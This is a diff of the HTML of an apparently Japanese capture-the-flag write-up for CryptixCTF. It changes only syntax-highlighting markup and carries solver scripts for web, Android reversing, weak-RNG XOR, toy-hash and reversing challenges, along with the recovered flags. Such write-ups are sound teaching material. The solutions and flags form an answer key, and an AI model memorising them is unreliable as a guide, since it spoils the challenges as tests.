@@ -120,9 +120,9 @@
 <h4 id="解く-1">解く</h4>
 <p><a href="https://cryptixctf.com/web1">問題ページ</a>のソースを見る。</p>
 <p>フラグの一部を確認</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!--</span><span style="color:#75715e"> Came for the flag? Bingo!
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- Came for the flag? Bingo!
 </span><span style="color:#75715e">              first part: flag{Pr3tty_ 
-</span><span style="color:#75715e">        </span><span style="color:#75715e">--&gt;</span>
+</span><span style="color:#75715e">        --&gt;</span>
 </code></pre></div><p><code>Sources</code>タブに行き、<code>style.css</code>と<code>script.js</code>も見てみる。</p>
 <p>同様にフラグの一部が書いてあるので組み合わせる。</p>
 <h4 id="フラグ-1">フラグ</h4>
@@ -174,16 +174,16 @@ dexファイルが確認できるので<code>dex2jar</code>でjarファイルに
   
   <span style="color:#66d9ef">int</span> b <span style="color:#f92672">=</span> 29<span style="color:#f92672">;</span>
   
-  <span style="color:#66d9ef">int</span><span style="color:#f92672">[</span><span style="color:#f92672">]</span> key <span style="color:#f92672">=</span> <span style="color:#f92672">{</span> 
+  <span style="color:#66d9ef">int</span><span style="color:#f92672">[]</span> key <span style="color:#f92672">=</span> <span style="color:#f92672">{</span> 
       4817<span style="color:#f92672">,</span> 6356<span style="color:#f92672">,</span> 3107<span style="color:#f92672">,</span> 6014<span style="color:#f92672">,</span> 2993<span style="color:#f92672">,</span> 6584<span style="color:#f92672">,</span> 5444<span style="color:#f92672">,</span> 2195<span style="color:#f92672">,</span> 5444<span style="color:#f92672">,</span> 4817<span style="color:#f92672">,</span> 
-      6527<span style="color:#f92672">,</span> 6014<span style="color:#f92672">,</span> 3050 <span style="color:#f92672">}</span><span style="color:#f92672">;</span>
+      6527<span style="color:#f92672">,</span> 6014<span style="color:#f92672">,</span> 3050 <span style="color:#f92672">};</span>
   
   <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">obf</span><span style="color:#f92672">(</span>String paramString<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
     <span style="color:#66d9ef">byte</span> b1 <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>b1 <span style="color:#f92672">&lt;</span> paramString<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-      <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> paramString<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>b1<span style="color:#f92672">)</span><span style="color:#f92672">;</span>
-      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">a</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">key</span><span style="color:#f92672">[</span>b1<span style="color:#f92672">]</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        b1<span style="color:#f92672">+</span><span style="color:#f92672">+</span><span style="color:#f92672">;</span>
+    <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>b1 <span style="color:#f92672">&lt;</span> paramString<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
+      <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> paramString<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>b1<span style="color:#f92672">);</span>
+      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">a</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">key</span><span style="color:#f92672">[</span>b1<span style="color:#f92672">])</span> <span style="color:#f92672">{</span>
+        b1<span style="color:#f92672">++;</span>
         <span style="color:#66d9ef">continue</span><span style="color:#f92672">;</span>
       <span style="color:#f92672">}</span> 
       <span style="color:#66d9ef">return</span> 0<span style="color:#f92672">;</span>
@@ -202,9 +202,9 @@ b <span style="color:#f92672">=</span> <span style="color:#ae81ff">29</span>
   
 b1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 <span style="color:#66d9ef">while</span> b1 <span style="color:#f92672">&lt;</span> len(enc):
-    i <span style="color:#f92672">=</span> (enc[b1] <span style="color:#f92672">-</span> b) <span style="color:#f92672">/</span><span style="color:#f92672">/</span> a
+    i <span style="color:#f92672">=</span> (enc[b1] <span style="color:#f92672">-</span> b) <span style="color:#f92672">//</span> a
     b1 <span style="color:#f92672">=</span> b1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
-    <span style="color:#66d9ef">print</span>(chr(i), end<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>)
+    <span style="color:#66d9ef">print</span>(chr(i), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
 </code></pre></div><p>実行結果</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">:# python3 android.py 
 To6i4s_&amp;_Tri5
@@ -283,23 +283,23 @@ b<span style="color:#e6db74">&#39;flag{w3ak_R5A_bad}&#39;</span>
 <span style="color:#f92672">import</span> string
 <span style="color:#f92672">from</span> deep_memory <span style="color:#f92672">import</span> message
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Encrpyt everything!!.... Oh no, system failure. Encrypting last message received</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Encrpyt everything!!.... Oh no, system failure. Encrypting last message received&#34;</span>)
 
 rand <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10000</span>)
 alphanum <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">random_string</span>(rand_seed, message):
     random<span style="color:#f92672">.</span>seed(rand_seed)
-    rand_string <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+    rand_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
     <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(message)):
-        rand_string <span style="color:#f92672">+</span><span style="color:#f92672">=</span> alphanum[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1000</span>)<span style="color:#f92672">%</span>len(alphanum)]
+        rand_string <span style="color:#f92672">+=</span> alphanum[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1000</span>)<span style="color:#f92672">%</span>len(alphanum)]
     <span style="color:#66d9ef">return</span> rand_string
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrpyt</span>(random_str, message):
-    encrpyted <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+    encrpyted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
     <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(message)):
         k <span style="color:#f92672">=</span> ord(message[i])<span style="color:#f92672">^</span>ord(random_str[i])
-        encrpyted <span style="color:#f92672">+</span><span style="color:#f92672">=</span> (bin(k)[<span style="color:#ae81ff">2</span>:])<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)
+        encrpyted <span style="color:#f92672">+=</span> (bin(k)[<span style="color:#ae81ff">2</span>:])<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)
     <span style="color:#66d9ef">return</span> encrpyted
 
 <span style="color:#66d9ef">print</span>(encrpyt(random_string(rand, message), message))
@@ -310,33 +310,33 @@ alphanum <span style="color:#f92672">=</span> string<span style="color:#f92672">
 
 alphanum <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
 
-f <span style="color:#f92672">=</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">seq.txt</span><span style="color:#e6db74">&#39;</span>)
+f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;seq.txt&#39;</span>)
 data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 f<span style="color:#f92672">.</span>close()
 
 data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>strip()
 enc <span style="color:#f92672">=</span> []
-<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(data) <span style="color:#f92672">/</span><span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>):
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(data) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>):
     binary <span style="color:#f92672">=</span> data[i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>:i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]
     enc<span style="color:#f92672">.</span>append(int(binary, <span style="color:#ae81ff">2</span>))
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">random_string</span>(rand_seed, message):
     random<span style="color:#f92672">.</span>seed(rand_seed)
-    rand_string <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+    rand_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
     <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(len(message)):
-        rand_string <span style="color:#f92672">+</span><span style="color:#f92672">=</span> alphanum[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1000</span>)<span style="color:#f92672">%</span>len(alphanum)]
+        rand_string <span style="color:#f92672">+=</span> alphanum[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1000</span>)<span style="color:#f92672">%</span>len(alphanum)]
     <span style="color:#66d9ef">return</span> rand_string
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrpyt</span>(random_str, enc):
-    decrpyted <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+    decrpyted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
     <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc)):
         k <span style="color:#f92672">=</span> enc[i]<span style="color:#f92672">^</span>ord(random_str[i])
-        decrpyted <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(k)
+        decrpyted <span style="color:#f92672">+=</span> chr(k)
     <span style="color:#66d9ef">return</span> decrpyted
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10000</span>):
     dec <span style="color:#f92672">=</span> decrpyt(random_string(i, enc), enc)
-    <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">flag</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> dec:
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#f92672">in</span> dec:
         <span style="color:#66d9ef">print</span>(dec)
 </code></pre></div><p>実行結果は以下の通り</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">:# python3 dec.py
@@ -353,22 +353,22 @@ flag<span style="color:#f92672">{</span>R4nd0m_s33d_s4v3d_y0u<span style="color:
 <p>問題のプログラムは以下の通り</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-hash.py" data-lang="hash.py"><span style="color:#f92672">import</span> random
 <span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> sqrt
-<span style="color:#f92672">from</span> primes <span style="color:#f92672">import</span> random_prime <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">Gives us a random prime for hashing</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span style="color:#f92672">from</span> primes <span style="color:#f92672">import</span> random_prime <span style="color:#e6db74">&#39;&#39;&#39;Gives us a random prime for hashing&#39;&#39;&#39;</span>
 <span style="color:#f92672">from</span> mymessages <span style="color:#f92672">import</span> a_secret 
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hash_it</span>(data, prime):
     hashed_number <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
     sum_key <span style="color:#f92672">=</span> ord(data) <span style="color:#f92672">+</span> prime
     mul_key <span style="color:#f92672">=</span> ord(data)<span style="color:#f92672">*</span>prime
-    numerator <span style="color:#f92672">=</span> ord(data)<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> prime<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> sum_key<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> mul_key<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+    numerator <span style="color:#f92672">=</span> ord(data)<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> prime<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> sum_key<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> mul_key<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>
     denominator <span style="color:#f92672">=</span> sqrt(ord(data)) <span style="color:#f92672">+</span> sqrt(prime) <span style="color:#f92672">+</span> sqrt(sum_key) <span style="color:#f92672">+</span> sqrt(mul_key)
     hashed_number <span style="color:#f92672">=</span> int(sqrt(numerator<span style="color:#f92672">/</span>denominator))
     <span style="color:#66d9ef">return</span> hex(hashed_number)
 
 
-True_hash <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+True_hash <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a_secret:
-    True_hash <span style="color:#f92672">+</span><span style="color:#f92672">=</span> hash_it(i, random_prime) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">:</span><span style="color:#e6db74">&#34;</span>
+    True_hash <span style="color:#f92672">+=</span> hash_it(i, random_prime) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span>
 <span style="color:#66d9ef">print</span>(True_hash)
 </code></pre></div><p>平文から1文字ずつ取ってきて<code>data</code>とし、<code>random_prime</code>となんやかんやして<code>hash</code>を生成している。
 それぞれ$d,p,h$とすれば、以下の関係が成り立っている。</p>
@@ -385,16 +385,16 @@ True_hash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1bf
     hashed_number <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
     sum_key <span style="color:#f92672">=</span> ord(data) <span style="color:#f92672">+</span> prime
     mul_key <span style="color:#f92672">=</span> ord(data)<span style="color:#f92672">*</span>prime
-    numerator <span style="color:#f92672">=</span> ord(data)<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> prime<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> sum_key<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> mul_key<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+    numerator <span style="color:#f92672">=</span> ord(data)<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> prime<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> sum_key<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> mul_key<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>
     denominator <span style="color:#f92672">=</span> sqrt(ord(data)) <span style="color:#f92672">+</span> sqrt(prime) <span style="color:#f92672">+</span> sqrt(sum_key) <span style="color:#f92672">+</span> sqrt(mul_key)
     hashed_number <span style="color:#f92672">=</span> int(sqrt(numerator<span style="color:#f92672">/</span>denominator))
     <span style="color:#66d9ef">return</span> hex(hashed_number)
 
-a_secret <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span>
+a_secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;f&#39;</span>
 left <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-right <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">17</span>
+right <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">**</span><span style="color:#ae81ff">17</span>
 <span style="color:#66d9ef">while</span> True:
-    p <span style="color:#f92672">=</span> (left <span style="color:#f92672">+</span> right) <span style="color:#f92672">/</span><span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>
+    p <span style="color:#f92672">=</span> (left <span style="color:#f92672">+</span> right) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
     hash <span style="color:#f92672">=</span> int(hash_it(a_secret, p), <span style="color:#ae81ff">16</span>)
     <span style="color:#66d9ef">if</span> True_hash <span style="color:#f92672">&lt;</span> hash:
         right <span style="color:#f92672">=</span> p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
@@ -402,11 +402,11 @@ right <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
         left <span style="color:#f92672">=</span> p <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
     <span style="color:#66d9ef">elif</span> True_hash <span style="color:#f92672">==</span> hash:
         <span style="color:#66d9ef">if</span> isprime(p):
-            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">p =</span><span style="color:#e6db74">&#34;</span>,p)
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;p =&#34;</span>,p)
         <span style="color:#66d9ef">else</span>:
             <span style="color:#66d9ef">pass</span>
         <span style="color:#66d9ef">break</span>
-    <span style="color:#66d9ef">if</span> left <span style="color:#f92672">&gt;</span><span style="color:#f92672">=</span> right:
+    <span style="color:#66d9ef">if</span> left <span style="color:#f92672">&gt;=</span> right:
         <span style="color:#66d9ef">break</span>
 </code></pre></div><p>（先頭文字は<code>f</code>であるはずなのでこれで$p$を探せる）</p>
 <p>実行結果は以下の通り</p>
@@ -425,19 +425,19 @@ hashes <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x1bf77
     hashed_number <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
     sum_key <span style="color:#f92672">=</span> ord(data) <span style="color:#f92672">+</span> prime
     mul_key <span style="color:#f92672">=</span> ord(data)<span style="color:#f92672">*</span>prime
-    numerator <span style="color:#f92672">=</span> ord(data)<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> prime<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> sum_key<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> mul_key<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+    numerator <span style="color:#f92672">=</span> ord(data)<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> prime<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> sum_key<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> mul_key<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>
     denominator <span style="color:#f92672">=</span> sqrt(ord(data)) <span style="color:#f92672">+</span> sqrt(prime) <span style="color:#f92672">+</span> sqrt(sum_key) <span style="color:#f92672">+</span> sqrt(mul_key)
     hashed_number <span style="color:#f92672">=</span> int(sqrt(numerator<span style="color:#f92672">/</span>denominator))
     <span style="color:#66d9ef">return</span> hex(hashed_number)
 
-flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(hashes)):
     <span style="color:#66d9ef">for</span> a_secret <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
         p <span style="color:#f92672">=</span> <span style="color:#ae81ff">99999721</span>
         True_hash <span style="color:#f92672">=</span> int(hash_it(a_secret, p), <span style="color:#ae81ff">16</span>)
         <span style="color:#66d9ef">if</span> True_hash <span style="color:#f92672">==</span> hashes[i]:
-            flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> a_secret
+            flag <span style="color:#f92672">+=</span> a_secret
             <span style="color:#66d9ef">break</span>
 <span style="color:#66d9ef">print</span>(flag)
 </code></pre></div><p>実行結果は以下の通り</p>
@@ -460,28 +460,28 @@ flag<span style="color:#f92672">{</span>Pr1m35_4r3_4W3s0m3<span style="color:#f9
   size_t sVar1;
   
   sVar1 <span style="color:#f92672">=</span> strlen(param_1);
-  <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)sVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x15</span>) {
-    <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> param_1[<span style="color:#ae81ff">0x10</span>]) {
-      <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> param_1[<span style="color:#ae81ff">0xb</span>]) {
-        <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> param_1[<span style="color:#ae81ff">8</span>]) {
-          <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> param_1[<span style="color:#ae81ff">0x12</span>]) {
-            <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> param_1[<span style="color:#ae81ff">0x11</span>]) {
-              <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> param_1[<span style="color:#ae81ff">0x14</span>]) {
-                <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> param_1[<span style="color:#ae81ff">10</span>]) {
-                  <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">0xc</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> param_1[<span style="color:#ae81ff">0x13</span>]) {
-                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>param_1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>) {
-                      <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>) {
-                        <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>) {
-                          <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span>) {
-                            <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>param_1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd6</span>) {
-                              <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>) {
-                                <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd5</span>) {
-                                  <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>) {
-                                    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2b</span>) {
-                                      <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xd</span>] <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xc</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0xcf</span>) {
-                                        <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xd</span>] <span style="color:#f92672">*</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xc</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x29ba</span>) {
-                                          <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xf</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xe</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd</span>) {
-                                            <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xf</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>param_1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>) {
+  <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)sVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x15</span>) {
+    <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">0x10</span>]) {
+      <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">0xb</span>]) {
